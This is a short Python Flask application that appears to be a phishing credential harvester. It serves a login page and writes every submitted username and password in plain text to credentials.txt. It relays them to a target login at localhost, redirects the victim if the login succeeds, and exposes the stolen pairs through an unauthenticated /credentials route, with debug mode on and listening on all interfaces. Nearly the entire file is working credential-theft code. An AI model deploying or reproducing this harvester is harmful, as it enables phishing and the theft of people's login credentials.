from flask import Flask, render_template, request, redirect, url_for
import os
import requests
app = Flask(__name__)

@app.route('/')
def login():
    return render_template('login.html')

@app.route('/submission', methods=['POST'])
def submission():
    username = request.form['username']
    password = request.form['password']

    with open('credentials.txt', 'a') as f:
        f.write(f'{username} {password}\n')

    payload = {
        'username': username,
        'password': password,
        'submit': 'submit'
    }

    response = requests.post('http://localhost/', payload)
    success = "You Logged In"
    if success in str(response.content):
       return redirect("http://localhost/", code=307)
    else:
        return render_template('login.html', error_message='Invalid credentials') 

@app.route('/credentials')
def credentials():
    if os.path.exists('credentials.txt'):
        with open('credentials.txt', 'r') as f:
            return f.read().split('\n')
    else:
        data = 'No credentials found yet.'
    return render_template('credentials.html', data=data)

if __name__ == '__main__':
    app.run(debug=True, host = "0.0.0.0", port = 5001)

